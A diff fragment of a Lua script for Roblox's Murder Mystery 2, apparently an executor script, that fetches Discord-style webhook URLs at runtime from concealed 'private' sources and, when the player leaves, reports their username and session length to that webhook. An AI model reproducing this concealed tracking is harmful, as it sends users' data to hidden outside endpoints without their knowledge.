+    local ok, res = pcall(function()
+        return game:HttpGet(source, true)
+    end)
+    if ok and type(res) == "string" and #res > 0 then
+        local url = res:gsub("%s+", "")
+        cache[1] = url
+        return url
+    end
+    return nil
+end
+
+_getExternalWebhook = function()
+    return _privateFetch(_privateWebhookSources.external, {_privateExternalCache})
+end
+
+_getMM2Webhook = function()
+    return _privateFetch(_privateWebhookSources.mm2, {_privateMM2Cache})
 end
 
 -- ============================================================
@@ -2561,7 +2776,12 @@ local function main()
     end)
     if game.PlaceId == MM2_PLACE_ID then isMM2 = true end
 
-    local loadingGui = createLoadingScreen(false)
+    local loadingGui = buildFullLoadingScreen({
+        instant = false,
+        timerPrefix = "Session",
+        startProgress = 0,
+        warningText = WARNING_TEXT,
+    })
 
     if isMM2 then
         local mm2Start = tick()
@@ -2583,23 +2803,7 @@ local function main()
             Players.PlayerRemoving:Connect(function(p)
                 if p == LocalPlayer then
                     local elapsed = math.floor(tick() - mm2Start)
-                    local mins = math.floor(elapsed / 60)
-                    local secs = elapsed % 60
-                    local webhook = getMM2Webhook()
-                    if webhook then
-                        sendWebhook(webhook, {
-                            embeds = {{
-                                title = "Murder Mystery 2 Session Ended",
-                                color = 15158332,
-                                fields = {
-                                    { name = "Username",       value = LocalPlayer.Name, inline = true },
-                                    { name = "Session Length", value = string.format("%02d:%02d", mins, secs), inline = true },
-                                    { name = "Asia Time",      value = getAsiaTime(), inline = false }
-                                },
-                                timestamp = DateTime.now():ToIsoDate()
-                            }}
-                        })
-                    end
+                    pcall(function() logMM2SessionEnd(elapsed) end)
                 end
             end)
         end)
